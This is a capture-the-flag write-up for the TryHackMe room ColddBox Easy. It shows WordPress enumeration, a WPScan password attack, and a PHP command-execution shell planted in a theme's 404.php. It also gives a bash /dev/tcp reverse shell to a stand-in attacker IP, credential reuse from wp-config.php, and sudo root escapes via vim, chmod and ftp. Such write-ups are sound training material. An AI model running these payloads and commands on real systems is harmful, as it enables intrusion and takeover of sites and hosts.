# ColddBox

An easy level machine with multiple ways to escalate privileges. By Hixec.

Room: https://tryhackme.com/room/colddboxeasy

## Summary

ColddBox Easy is a WordPress focused boot2root room. The route taken here was:

1. Full port scan found HTTP on port 80 and SSH on port 4512.
2. WPScan identified WordPress 4.1.31, XML-RPC, the active Twenty Fifteen theme, Akismet, and users.
3. Gobuster found the hidden directory `/hidden/`.
4. `/hidden/` gave a clue about `c0ldd` changing Hugo's password.
5. WPScan password attack found valid WordPress credentials for `c0ldd`.
6. WordPress theme editor was used to add command execution to the Twenty Fifteen `404.php` template.
7. The edited theme file was triggered directly to catch a reverse shell as `www-data`.
8. `wp-config.php` contained database credentials for `c0ldd`, and the password was reused to `su c0ldd`.
9. The user flag was Base64 encoded.
10. `sudo -l` showed `c0ldd` could run `vim`, `chmod`, and `ftp` as root.
11. Root was obtained with sudo abuse.
12. The root flag was also Base64 encoded.

## Enumeration

Started with a full port scan and version detection.

```bash
root@ip-REDACTED:~# nmap -sV -p- TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-09 07:10 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for TARGET
Host is up (0.00029s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds
```

Only two ports were open:

| Port | Service | Notes |
|---|---|---|
| 80 | HTTP | Apache 2.4.18, WordPress site |
| 4512 | SSH | Non-standard SSH port |

The unusual SSH port was noted, but the web app looked like the intended starting point.

## WordPress enumeration with WPScan

WPScan found WordPress and several useful findings.

```bash
root@ip-REDACTED:~# wpscan --url http://TARGET --api-token "$WPSCAN_API_TOKEN" --enumerate ap,at,u --plugins-detection aggressive --random-user-agent
```

Important findings from the output:

```text
[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)

[+] XML-RPC seems to be enabled: http://TARGET/xmlrpc.php

[+] WordPress readme found: http://TARGET/readme.html

[+] The external WP-Cron seems to be enabled: http://TARGET/wp-cron.php

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
```

WPScan reported many WordPress core vulnerabilities. For this room, they were mostly noise. The useful part was confirming an old WordPress install and getting users.

The active theme was Twenty Fifteen:

```text
[+] WordPress theme in use: twentyfifteen
 | Location: http://TARGET/wp-content/themes/twentyfifteen/
 | Style Name: Twenty Fifteen
 | Version: 1.0 (80% confidence)
```

Akismet was also installed:

```text
[i] Plugin(s) Identified:

[+] akismet
 | Location: http://TARGET/wp-content/plugins/akismet/
 | Version: 3.0.4 (100% confidence)
```

Users found:

```text
[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
```

## Directory enumeration

Used Gobuster with a medium wordlist and common extensions.

```bash
root@ip-REDACTED:~# export TARGET=TARGET
root@ip-REDACTED:~# export WORDLIST=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
root@ip-REDACTED:~# gobuster dir -u http://$TARGET -w $WORDLIST -x php,txt,bak,old,zip,html -o gobuster-$TARGET.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://TARGET
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,bak,old,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/index.php            (Status: 301) [Size: 0] [--> http://TARGET/]
/wp-content           (Status: 301) [Size: 317] [--> http://TARGET/wp-content/]
/wp-login.php         (Status: 200) [Size: 2547]
/license.txt          (Status: 200) [Size: 19930]
/wp-includes          (Status: 301) [Size: 318] [--> http://TARGET/wp-includes/]
/readme.html          (Status: 200) [Size: 7173]
/wp-trackback.php     (Status: 200) [Size: 135]
/wp-admin             (Status: 301) [Size: 315] [--> http://TARGET/wp-admin/]
/hidden               (Status: 301) [Size: 313] [--> http://TARGET/hidden/]
/xmlrpc.php           (Status: 200) [Size: 42]
/wp-signup.php        (Status: 302) [Size: 0] [--> /wp-login.php?action=register]
/server-status        (Status: 403) [Size: 277]
Progress: 1527925 / 1527932 (100.00%)
===============================================================
Finished
===============================================================
```

The standout result was `/hidden`.

## Hidden note

Viewing the source of `/hidden/` gave a clue.

```text
view-source:http://TARGET/hidden/
```

```html
<!DOCTYPE html> <html> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> <title>Hidden Place</title> </head> <body> <div align="center"> <h1>U-R-G-E-N-T</h1> <h2>C0ldd, you changed Hugo's password, when you can send it to him so he can continue uploading his articles. Philip</h2> </div> </body> </html>
```

This connects three names:

- `c0ldd`
- `hugo`
- `philip`

The hint sounds like `c0ldd` changed Hugo's password, so a password attack against the discovered WordPress users made sense.

## WordPress password attack

A WPScan login attack found valid credentials for `c0ldd`.

```bash
wpscan --url http://$TARGET --usernames c0ldd --passwords "$PASSLIST" --password-attack wp-login
```

Output with the credential obfuscated:

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - c0ldd / REDACTED
Trying c0ldd / REDACTED Time: 00:00:14 <                                                                   > (1225 / 14345616)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: c0ldd, Password: REDACTED

[+] Finished: Sat May  9 07:54:29 2026
[+] Requests Done: 1279
[+] Cached Requests: 5
[+] Data Sent: 419.146 KB
[+] Data Received: 4.708 MB
[+] Memory used: 225.684 MB
[+] Elapsed time: 00:00:24
```

With valid WordPress credentials, I logged into `/wp-admin`.

## WordPress theme editor to command execution

The active theme was `twentyfifteen`, so I edited its `404.php` template from the WordPress theme editor.

```text
http://TARGET/wp-admin/theme-editor.php?file=404.php&theme=twentyfifteen&scrollto=0&updated=true
```

At the top of `404.php`, I added:

```php
<?php system($_GET['cmd']); ?>
```

The start of the edited file looked like this:

```php
<?php system($_GET['cmd']); ?>

<?php

/**
 * The template for displaying 404 pages (not found)
 *
 * @package WordPress
 * @subpackage Twenty_Fifteen
 * @since Twenty Fifteen 1.0
 */
```

Normal random URLs were returning Apache's own 404, so the WordPress 404 template was triggered directly by requesting the theme file.

```text
http://TARGET/wp-content/themes/twentyfifteen/404.php?cmd=id
```

## Reverse shell

Started a listener locally:

```bash
pingu@nootnoot:/opt$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Triggered the reverse shell through the edited `404.php` file. IP has been redacted.

```text
http://TARGET/wp-content/themes/twentyfifteen/404.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'
```

Shell received:

```text
Connection received on TARGET 54740
bash: cannot set terminal process group (1339): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$
```

Confirmed the user:

```bash
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ whoami
whoami
www-data
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Local enumeration as www-data

At first, readable files owned by `c0ldd` were not enough to get the user flag directly.

```bash
www-data@ColddBox-Easy:/home/c0ldd$ find / -user c0ldd -type f -readable 2>/dev/null
/home/c0ldd/.bashrc
/home/c0ldd/.bash_logout
/home/c0ldd/.sudo_as_admin_successful
/home/c0ldd/.profile
```

The better target was WordPress configuration.

```bash
cat wp-config.php
```

Relevant obfuscated section:

```php
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'REDACTED');
```

The database credentials reused the local Linux account name. Trying the database password with `su` worked.

```bash
www-data@ColddBox-Easy:/var/www/html$ su c0ldd
su c0ldd
Password: REDACTED

c0ldd@ColddBox-Easy:/var/www/html$
```

## User flag

The user flag was in `/home/c0ldd/user.txt` and was Base64 encoded.

```bash
c0ldd@ColddBox-Easy:~$ cat user.txt
cat user.txt
REDACTED_BASE64_USER_FLAG

c0ldd@ColddBox-Easy:~$ cat user.txt | base64 -d
cat user.txt | base64 -d
Felicidades, ------ ----- --------
```

Translation:

```text
Congratulations, ----- ----- -----
```

## Privilege escalation enumeration

Checked sudo permissions.

```bash
sudo -l
[sudo] password for c0ldd: REDACTED

Coincidiendo entradas por defecto para c0ldd en ColddBox-Easy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp
```

This is the main privilege escalation issue. The user `c0ldd` can run multiple root-capable binaries with sudo.

## Root via vim

The cleanest route is `vim` shell escape.

```bash
sudo /usr/bin/vim -c ':set shell=/bin/bash' -c ':shell'
```

Alternative interactive method:

```bash
sudo /usr/bin/vim
```

Inside vim:

```vim
:!/bin/bash
```

## Root via chmod

This method works but modifies `/bin/bash`, so it is not as clean for a writeup.

```bash
c0ldd@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ sudo /bin/chmod u+s /bin/bash
c0ldd@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ /bin/bash -p
bash-4.3# whoami
whoami
root
```

## Root via ftp

The `ftp` binary also allows shell escape.

```bash
c0ldd@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ sudo /usr/bin/ftp
ftp> !/bin/sh
# whoami
whoami
root
```

## Root flag

The root flag was also Base64 encoded.

```bash
root@ColddBox-Easy:/root# cat root.txt
cat root.txt
REDACTED_BASE64_ROOT_FLAG
root@ColddBox-Easy:/root# cat root.txt | base64 -d
cat root.txt | base64 -d
¡Felicidades, ------ ---------
```

Translation:

```text
Congratulations, -------- ------
```

## Lessons learned

- Gobuster found `/hidden/`, which gave a useful username clue.
- WPScan user enumeration and password attack were enough for the WordPress foothold.
- The WPScan CVE list was mostly noise for this route. The actual foothold was weak credentials.
- Theme editor access is effectively code execution when a PHP theme file is writable.
- If a normal WordPress 404 route does not load the theme template, try directly requesting the edited theme file.
- WordPress `wp-config.php` is always worth checking after landing as `www-data`.
- Reused database credentials can become local Linux credentials.
- `sudo -l` quickly exposed the root path.
- `vim`, `ftp`, and `chmod` were all valid root escalation options here.

## Final attack chain

```text
Nmap
  -> HTTP on 80 and SSH on 4512
WPScan
  -> WordPress 4.1.31
  -> users: hugo, c0ldd, philip
Gobuster
  -> /hidden/
Hidden note
  -> password clue involving c0ldd and Hugo
WPScan password attack
  -> valid c0ldd WordPress login
WordPress admin
  -> edit Twenty Fifteen 404.php
Direct theme file trigger
  -> reverse shell as www-data
wp-config.php
  -> c0ldd database password
su c0ldd
  -> user shell
sudo -l
  -> vim, chmod, ftp allowed as root
sudo vim, sudo chmod, or sudo ftp
  -> root shell
Base64 decode flags
  -> room complete
```
